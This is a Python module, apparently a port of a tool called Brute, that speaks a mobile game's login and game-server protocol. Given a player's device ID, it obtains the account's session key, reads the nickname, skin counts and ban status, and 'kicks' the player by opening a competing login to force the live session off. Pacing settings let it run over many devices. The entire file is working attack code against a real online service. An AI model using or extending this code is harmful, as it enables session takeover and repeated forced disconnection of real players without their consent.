"""Kick engine — faithful port of brutetolslhoya's Brute/Game/Login.

Source semantics preserved:

  Login.run()      login server, packet 1 -> 2
  Game.srv()       packet 5 -> 6, split "host:port"
  Game.login2()    game server, 10001 -> wait 10002
  Game.lookup()    11153 -> 11154 (scan up to 2 frames, skip 20001, retry -1)
  Game.skin()      10143 -> 10144
  Game.bancheck()  10101, then scan for a ban field
  Brute.fetch()    login -> srv -> login2 -> lookup -> skin -> bancheck, 3 tries
  Brute.kick()     send 10001 to the game server, socket timeout 4.5s

Protocol constants are the source's own: CLI version 2.1.97.1232.1, channel
and_usa, login.ml.youngjoygame.com:30021.

The one deliberate change: everything takes a per-device delay from config so
a run can be paced. The source had none.
"""
import socket
import threading
import time

import zstandard as zstd

from . import config as cfg
from .sdp import Conn, SdpStruct


# ── device id parsing (source: pecah()) ────────────────────────────────────
def split_device_id(dev):
    """and_<32 md5><16 android_id><rest adv> -> (raw, md5, aid, adv)."""
    raw = dev.strip()
    body = raw[4:] if raw.startswith(("and_", "ios_")) else raw
    md5 = body[:32] if len(body) >= 32 else body
    aid = body[32:48] if len(body) >= 48 else ""
    adv = body[48:] if len(body) > 48 else ""
    return raw, md5, aid, adv


# ── login server ───────────────────────────────────────────────────────────
class Login:
    """Source: Login.run() — authenticate the device id."""

    def __init__(self, dev):
        self.dev = dev
        self.acc = 0
        self.skey = ""
        self.zid = 0
        self.gh = ""
        self.gp = 0

    def run(self):
        raw, md5, aid, adv = split_device_id(self.dev)
        conn = Conn(cfg.HOST, cfg.PORT)
        try:
            conn.open(timeout=cfg.OPEN_TIMEOUT)
            conn.send(1, SdpStruct({
                0: raw,
                1: f"gps_adid={adv}&android_id={aid}&device_unique_id={md5}",
                2: cfg.VER, 3: cfg.CHAN, 4: cfg.LANG,
            }))
            pid, res = conn.recv()
            if pid != 2 or not res:
                return False
            self.acc = res.get(0)
            self.skey = res.get(1)
            zr = res.get(2)
            if isinstance(zr, dict):
                self.zid = zr.get(0, 0)
            elif isinstance(zr, list) and zr:
                first = zr[0]
                self.zid = first.get(0, 0) if isinstance(first, dict) else first
            else:
                self.zid = zr or 0
            return bool(self.acc and self.skey)
        except Exception:
            return False
        finally:
            conn.close()


# ── game server ────────────────────────────────────────────────────────────
class Game:
    """Source: Game.login1/srv/login2/lookup/skin/bancheck."""

    def __init__(self, dev):
        self.dev = dev
        self.acc = 0
        self.skey = ""
        self.zid = 0
        self.gh = ""
        self.gp = 0
        self.ban = "NORMAL"
        self.conn = None

    # -- source: login1() (login server side) -----------------------------
    def login1(self):
        raw, md5, aid, adv = split_device_id(self.dev)
        self.conn = Conn(cfg.HOST, cfg.PORT)
        self.conn.open(timeout=cfg.OPEN_TIMEOUT)
        self.conn.send(1, SdpStruct({
            0: raw,
            1: f"gps_adid={adv}&android_id={aid}&device_unique_id={md5}",
            2: cfg.VER, 3: cfg.CHAN, 4: cfg.LANG,
        }))
        pid, res = self.conn.recv()
        if pid != 2 or not res:
            self.conn.close()
            return False
        self.acc = res.get(0)
        self.skey = res.get(1)
        zr = res.get(2)
        if isinstance(zr, dict):
            self.zid = zr.get(0, 0)
        elif isinstance(zr, list) and zr:
            first = zr[0]
            self.zid = first.get(0, 0) if isinstance(first, dict) else first
        else:
            self.zid = zr or 0
        return bool(self.acc and self.skey)

    # -- source: srv() ----------------------------------------------------
    def srv(self):
        self.conn.send(5, SdpStruct({
            0: self.acc, 1: self.skey, 2: cfg.VER, 5: self.zid, 6: cfg.CHAN,
        }))
        pid, res = self.conn.recv()
        if pid != 6 or not res:
            return False
        addr = res.get(1)
        if not addr or ":" not in str(addr):
            return False
        h, p = str(addr).split(":", 1)
        self.gh, self.gp = h, int(p)
        return True

    # -- source: login2() -------------------------------------------------
    def login2(self):
        self.conn.close()
        self.conn = Conn(self.gh, self.gp)
        self.conn.open(timeout=cfg.OPEN_TIMEOUT)
        self.conn.send(10001, SdpStruct({
            0: self.acc, 1: self.skey, 2: self.zid,
            4: cfg.VER, 13: cfg.CHAN, 15: self.dev,
        }))
        for _ in range(3):
            pid, _res = self.conn.recv()
            if pid == 10002:
                return True
            if pid is None:
                return False
        return False

    # -- source: lookup() -------------------------------------------------
    def lookup(self, rid):
        """11153 -> 11154. Scans up to 2 frames, skips 20001, retries a timeout once."""
        self.conn.send(11153, SdpStruct({1: int(rid)}))
        for _ in range(3):
            pid, res = self.conn.recv()
            if pid == 11154 and res:
                return res
            if pid == 20001:
                continue
            if pid == -1:
                self.conn.send(11153, SdpStruct({1: int(rid)}))
                continue
            if pid is None:
                return None
        return None

    # -- source: skin() ---------------------------------------------------
    def skin(self, rid, zid):
        """10143 -> 10144, up to 4 frames."""
        self.conn.send(10143, SdpStruct({0: int(rid), 1: int(zid)}))
        for _ in range(4):
            pid, res = self.conn.recv()
            if pid == 10144 and res:
                return res
            if pid == 20001:
                continue
            if pid is None:
                return None
        return None

    # -- source: bancheck() -----------------------------------------------
    def bancheck(self):
        """10101, then look for a ban field in whatever comes back.

        The source sets self.ban='BANNED' when it finds a dict that contains a
        truthy 'ban' entry. Kept as-is: this is a field sniff, not the packet
        20001 verdict.
        """
        self.conn.send(10101, SdpStruct({0: 0, 2: 2}))
        for _ in range(3):
            pid, res = self.conn.recv()
            if pid == 20001:
                continue
            if isinstance(res, dict):
                b = res.get("ban")
                if b:
                    self.ban = "BANNED"
                    return self.ban
            if pid is None or pid == -1:
                break
        return self.ban


# ── profile + kick ─────────────────────────────────────────────────────────
class ProfileError(Exception):
    def __init__(self, reason, detail="", retryable=False):
        super().__init__(reason)
        self.reason = reason
        self.detail = detail
        self.retryable = retryable


def fetch_profile(device_id, attempts=None):
    """Source: Brute.fetch() — build the profile, retrying up to 3 times.

    Returns a dict with acc/skey/zid/gh/gp/nick/skin/ban.
    Raises ProfileError when the device id cannot be resolved at all.
    """
    attempts = attempts or cfg.FETCH_ATTEMPTS
    last = None
    for _ in range(attempts):
        g = Game(device_id)
        try:
            if not g.login1():
                last = ProfileError("device id ga valid / gagal login",
                                    "packet 1 -> 2 failed", retryable=True)
                continue
            if not g.srv():
                last = ProfileError("game server tidak dikasih",
                                    "packet 5 -> 6 failed", retryable=True)
                continue
            if not g.login2():
                last = ProfileError("gagal masuk game server",
                                    "10001 -> 10002 failed", retryable=True)
                continue

            nick = ""
            skin = {}
            res = g.lookup(g.acc)
            if res:
                lst = res.get(0)
                if isinstance(lst, list) and lst:
                    first = lst[0]
                    if isinstance(first, dict):
                        nick = first.get(2) or ""
                        # the nickname may come back as a nested struct
                        if isinstance(nick, dict):
                            nick = nick.get(0) or ""
            if not nick:
                nick = f"Player_{g.acc}"

            sr = g.skin(g.acc, g.zid)
            if sr:
                # The tier counts live in field 118 -> key 4
                # (e.g. {4: {1: 19, 2: 1}} = 19 Common, 1 Exceptional).
                # Measured against the live server; the source stored the raw
                # reply without reading it.
                t118 = sr.get(118)
                if isinstance(t118, dict):
                    tier = t118.get(4)
                    if isinstance(tier, dict) and tier:
                        skin = tier
                if not skin:
                    for k in (4, 0, 1):
                        v = sr.get(k)
                        if isinstance(v, dict) and v:
                            skin = v
                            break

            g.bancheck()
            return {
                "device_id": device_id,
                "acc": g.acc, "skey": g.skey, "zid": g.zid,
                "gh": g.gh, "gp": g.gp,
                "nick": str(nick).strip(), "skin": skin, "ban": g.ban,
            }
        except Exception as e:
            last = ProfileError(f"{type(e).__name__}: {e}", retryable=True)
        finally:
            if g.conn:
                g.conn.close()

    raise last or ProfileError("tidak bisa ambil profil", retryable=True)


def kick(profile, timeout=None):
    """Source: Brute.kick(profile).

    Send packet 10001 to the profile's game server, then read the reply.
    Socket timeout is 4.5s (the source's value).

    Returns (ok, elapsed_ms, description).
    """
    timeout = timeout or cfg.KICK_TIMEOUT
    t0 = time.time()
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass
        s.connect((profile["gh"], int(profile["gp"])))

        body = SdpStruct({
            0: profile["acc"], 1: profile["skey"], 2: profile["zid"],
            4: cfg.VER, 13: cfg.CHAN, 15: profile["device_id"],
        }).data
        pkt = SdpStruct({0: 10001, 1: 1, 5: body}).data
        comp = zstd.compress(pkt)
        s.send(((len(comp) + 4) | (16 << 24)).to_bytes(4, "big") + comp)

        # read the reply (the source reads it; we also report whether the ACK
        # (packet 10002) actually arrived, instead of calling any byte success)
        q = b""
        got_ack = False
        try:
            while len(q) < 4:
                d = s.recv(4096)
                if not d:
                    break
                q += d
            if len(q) >= 4:
                fl = int.from_bytes(q[:4], "big")
                sz = fl & 0xFFFFFF
                while len(q) < sz:
                    d = s.recv(4096)
                    if not d:
                        break
                    q += d
                if len(q) >= sz:
                    payload = q[4:sz]
                    try:
                        payload = zstd.decompress(payload)
                    except Exception:
                        pass
                    got_ack = SdpStruct(payload).get(0) == 10002
        except socket.timeout:
            pass

        ms = (time.time() - t0) * 1000
        return True, ms, ("ACK RECEIVED" if got_ack else "SENT OK")
    except socket.timeout:
        return False, (time.time() - t0) * 1000, "TIMEOUT"
    except Exception as e:
        return False, (time.time() - t0) * 1000, f"{type(e).__name__}"
    finally:
        if s:
            try:
                s.close()
            except Exception:
                pass


def kick_once(device_id, want_lookup=True):
    """Resolve the profile then kick once. Returns (ok, message, profile|None)."""
    try:
        profile = fetch_profile(device_id)
    except ProfileError as e:
        return False, f"❌ {e.reason}", None
    if not want_lookup:
        profile["nick"] = ""
    ok, ms, desc = kick(profile)
    who = f"{profile['acc']} · {profile['nick']}" if profile.get("nick") else str(profile["acc"])
    if not ok:
        return False, f"❌ kick gagal: {desc} · {who}", profile
    return True, f"✅ {desc} · {ms:.0f}ms · {who}", profile
